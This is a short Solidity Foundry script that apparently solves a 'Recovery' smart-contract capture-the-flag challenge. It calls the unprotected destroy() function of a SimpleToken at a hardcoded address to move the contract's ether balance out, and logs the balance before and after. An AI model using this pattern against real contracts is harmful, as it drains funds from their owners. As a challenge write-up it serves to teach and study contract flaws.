// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract RecoverySolution is Script {
    
    address payable target = payable(0x2A2c5cA4F4008C0E6c9130F1BB64004aa1281A23) ;
    SimpleToken simpleToken = SimpleToken(target);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Name of the token: ", simpleToken.name());
        console.log("Balance before transfer: ", address(target).balance);
        simpleToken.destroy(payable(address(this)));
        console.log("Balance after transfer: ", address(target).balance);

        vm.stopBroadcast();
    }
}